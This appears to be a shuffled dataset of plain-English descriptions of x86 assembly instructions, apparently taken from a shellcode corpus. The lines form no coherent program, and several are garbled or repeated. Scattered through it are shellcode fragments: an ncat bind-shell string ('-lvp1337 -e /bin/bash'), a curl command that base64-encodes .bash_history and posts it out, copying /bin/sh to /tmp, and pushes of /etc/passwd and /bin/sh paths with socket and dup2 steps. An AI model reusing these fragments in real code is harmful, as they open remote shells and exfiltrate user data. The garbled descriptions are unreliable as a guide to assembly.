move 1222 into esi
push 0x204c4c41 onto the stack
move ebp into esp
move readbuffer into ecx
section data
define the array of bytes of the array word_table
define format label
declare the set_argv label
move 0xcd into al
push bx to the stack
divide eax by esi
subtract the contents of memory address esi+4*eax from the contents of the ecx register
push 0x61702f63 onto the stack
declare section containing code
decrement the contents of the ecx register and jump to the dup2loop label if the result is not zero
define string as the byte string 'prova.txt'
move dl into the byte at address stored in ecx+92
push the 0x4 onto the stack
make kernel call to terminate the program
swap the contents of the ecx register with the contents of the edx register
move 6 into al
move decimal number 8 into ax
declare the set_argv label
subtract 13 from the contents of ax register and save the result in ax
if the unsigned contents of the cl register is lower than the unsigned value 10 then jump to the label else add the value 10 to the dl register
move 25 into the address [esp+58]
jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register
define the byte value 10 to 10
call the esp function
perform the xor operation between the ah register and ah and ah and save the result in ah
perform the xor operation between cl and 0xaa and 0xaa and 0xaa
jump to the l2 label if the byte starting at the address contained in the edx register is not equal to the byte value 0x2e else jump to the while label
jump to the label write if the contents of the eax register is zero else zero out the contents of the eax register
compare the contents of the al register with the value 0xf2
left rotate the byte in esi 2 times
move the contents of the eax register into the long starting at the address [esi+26]
move the contents of the al register into the edi register
push the 0xa01a8c0 onto the stack
make the system call exit
jump to the address specified by the operation esp register
if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else
put the syscall 49 into the eax register
declare the l00p label
move 102 into al
make the system call write
open
jump to the next_page label if the contents of the al register is equal to the value 0xf2
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
move the value 0x72702f2f into esi
jump to the decoded_shellcode label if the zero flag is set
execute the reboot syscall
call the _printf function
if the byte starting at the address contained in the esi register is lower than the byte value 0xd then jump to the wrap_around label
move the byte in esi into cl
push the contents of the eax register onto the stack and point edx to the stack register
jump to the next_cycle label if the result of the logical xor between the dl register and the value 0xbb is zero
restore the top of the stack into the ebx register
call the _build function
load the effective address [zero_reg+3] into eax
move 9 into cl
jump to the label l1 if the contents of the al register is greater than or equal to the decimal value 9
move effective address of request variable into al
define the doubleword variable real_number2 and initialize 123456
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
decrement ecx
move the value of register into cl
move 3 to the edx register
define the doubleword variable real_number1 and initialize it to 0x0
move effective address of request variable into al
push the contents of ebx register onto the stack
move esp into edx
push the byte 0x1f onto the stack
move esi into bx
push the dword 0x6f726577 onto the stack
subtract 1564 from the contents of the dx register
move 0xb33fb33f into eax
load the effective address of the result of the operation [ecx+4] into the eax register
jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270
add esi to eax
move cl into bl
declare the set_argv label
declare the _build label
add 0xa to the contents of al
move the word in ax into the memory location specified by the operation [ebp+22]
clear the ebx register
move ecx to edx
divide ecx by 2 using right shift
make the system call alarm
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register
right shift the contents of the edx register by the byte value 48
move /bin/sh into edx
push the 0xa01a8c0 onto the stack
push the 0xa01a8c0 onto the stack
multiply eax by ebx
push the 0xa01a8c0 onto the stack
divide eax by edx
push the contents of eax register onto the stack
push 0x10 onto the stack
move 1222 into esi
declare the set_argv label
move 0x563ed8b7 into eax
push the value 0x6e7a762d onto the stack and point the edi register to the stack register
sigaction
move 3 into cx
add decimal value to edx
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
point ebp to the esp register
if the contents of the eax register is not zero then jump to the label checkforfile
move 0x563ed8b7 into eax
clear the byte at the address specified by the operation [esi+1+ebp] into the esi register
jump to the label ready_to_proxy if the contents of the eax register is zero
move 0x2 into dl
push the byte 10 onto the stack
move esi into the doubleword starting at the address esp-4
make the system call write
push the contents of the esi register onto the stack and point eax to the stack register
push 0x74 onto the stack
move /bin/sh into ecx
declare the set_argv label
compare if the contents of the memory location specified by the operation [esi+30]
push 0x64687373 onto the stack
put the syscall chmod_call into the eax register
call the two function
declare section bss
put the syscall 0xc into the eax register
invoke subroutine socket
declare the set_argv label
declare the set_argv label
move 0666 into cx
push the byte 49 onto the stack
declare the set_argv label
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register
call the writestring function
move dl into the byte at address [esi + 1]
push the 0xa01a8c0 onto the stack
make the system call to get the process id
make the system call to get the process group
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register
jump to the l00p label if the zero flag is cleared
push esp onto the stack
push nib/
push the byte my_value onto the stack
restore the top of the stack into the eax register
declare the fileaddress label
move the contents of memory address ebx+esi into edx
jump short to the stage label
push 0x622f7273 onto the stack
move 0x563ed8b7 into eax
jump to the stage label
push the 0x0a206873 onto the stack
declare the set_argv label
push 0x1c onto the stack
reserve 1 byte for variablename2
move 0x06 into al
define len equal to the lenght of the encodedshellcode array
push the 0xa01a8c0 onto the stack
reserve 1 byte for variablename2
swap the contents of eax and ebx
move 0xb into al
define the exit label
define check_even_odd function
move 4 into ebx
jump short to the call_write label
left rotate the contents of the edi register by 1 bit
define message as the byte string '/bin/sh'
add memory[di to eax
move the byte in eax into bl
decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
jump to the dup2 label if the previous instruction clears the sign flag
make the system call alarm
put the syscall 6 into the eax register
move the contents of the bl register into the byte starting at the address in edi
move zero_reg into ebx
jump short to the _load_data label
move 0x66 into al
if the contents of the eax register is not zero then jump to the label l4 else call the function search
move the byte in esi into bl
declare the set_argv label
jump short to the four label
push the 0xa01a8c0 onto the stack
jump to the carryon label if the zero flag is cleared
push the byte 3 onto the stack and point ebx to the stack register
if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct
push the dword 0x6f726577 onto the stack
move bl into the byte at address stored in esi+ecx
push the value 0x6374652f onto the stack and point ecx to the stack register
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register
move the byte in edi into bl
mask out lowest 4 bits of the eax register
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register
right shift the contents of the edi register by the contents of the memory location specified by the operation [bp+0x32]
move 0x167 into ax
move 3 into bl
negate all the bits of eax register
push the byte 16 onto the stack
load the effective address of the result of the operation [esi + 8] into the edx register
multiply eax by the contents of the edx register
left rotate the edx register 4 times
move 0x167 into ax
make the system call to get the process id
make the system call to get the process group
define ip equal to the length of shellcode
jump to _star label
jump to the _start label if the contents of the al register is equal to the value 0xf2
push 0x68732f2f onto the stack
push the 0xa01a8c0 onto the stack
move eax into edi
move filename into ebx
right shift the byte in esi 1 time
move 15 into al
load the effective address [zero_reg+117] into ecx
push the dword 0x6f726577 onto the stack
declare the dup2 label
increment ebx
perform a logical xor between the dh register and save the result in ecx
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register
move the number of bytes of var4 into ebx
push double word 0x6873 onto the stack and point the ebx register to the stack register
if the contents of the eax register is negative then jump to the label old_dirent
push 0x6873732f onto the stack
jump to the shift_decode label if the zero flag is set
move esp into eax
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
jump to incaddr if not zero
add 0x21354523 to the doubleword integer stored at memory location var
jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7
push the contents of eax register onto the stack
if the contents of the eax register is negative then jump to the label close
push the word 0x5c11 onto the stack
declare the set_argv label
write to the stdin file
push the contents of eax register onto the stack
move the byte in eax into bl
subtract 0x2e2aa163 from ebx and save the result into ebx
increment bl
add the contents of the edi register to the contents of the edi register
move 0x563ed8b7 into eax
move 13 into cl
make the system call write
move esi into ecx
jump to the loop label
declare the set_argv label
jump to the incpage label if the contents of the al register is equal to the value 0xf2
declare the set_argv label
push the contents of esi register onto the stack
define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'
call the _build function
negate all the byte at address specified by the operation [ebp+0x59]
push the value 0x64687373 onto the stack and point the eax register to the stack register
move 1222 into esi
make the system call to send the signal to another process
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
declare the set_argv label
declare the set_argv label
make the system call to send the signal to another process
push 0x74 onto the stack
define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
move al into the byte at address [esi+14]
move esp into edx
move the contents of the esp register into the ebx register
swap the values of the memory location specified by the operation [eax+1] and save the result in ecx
if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the byte representation of the value 0x1 onto the stack
define a string as the byte string 'hello world!'
push the 0xa01a8c0 onto the stack
perform a logical xor between the esi register and esi register and esi register and save the result in esi
move 0x2 into cl
push the dword 0x73656c62 onto the stack
move the effective address of request variable into bl
perform and operation between al and save the result in al
jump short to the memory location loc_402c13
jump to the label write if the contents of the eax register is zero else zero out the contents of the eax register
set the direction flag to zero
divide ax by 2 using right shift
declare the set_argv label
define the byte string 'cp /bin/sh /tmp/sh'
push the contents of esi register onto the stack
push the word 0x697a onto the stack
make the system call to get the process id
push the 0xa01a8c0 onto the stack
right shift the contents of ebx by 31 bits
jump short to the _execline label
load the effective address [zero_reg+6] into eax
push the value 0x0 onto the stack
increment ax
declare the setup label
section data
increment dx
jump to the encoded label
move len into cl
move 0x7f into dl
move 2 into bl
multiply ecx by 4 using left shift
decrement ecx and jumps to the l1 label if the count is not zero and the zero flag is equal to zero
make the system call getpid
restore the top of the stack into the edx register
put the syscall 9 into the eax register
perform the xor operation between the ah register and ah and ah and save the result in ah
jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
push the word 0x1b6 to the stack
define mylist word
make the system call to suspend the process
call the _params function
define me label
restore the top of the stack into the cx register
perform the xor operation between eax register and 0xffffffff
push the word [edx] to the stack
push the contents of eax register onto the stack
move the byte at the address 0ffh into dl
push the contents of the edi register onto the stack and point ebx to the stack register
negate all the byte at address tmp
zero out eax
move the contents of the ebx register into the ebx register
decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
push ecx onto the stack
put the syscall 0x64 into the eax register
add edi to edi
move the contents of the ebx register into the long starting at the address [esi+26]
subtract 1564 from the contents of the dx register
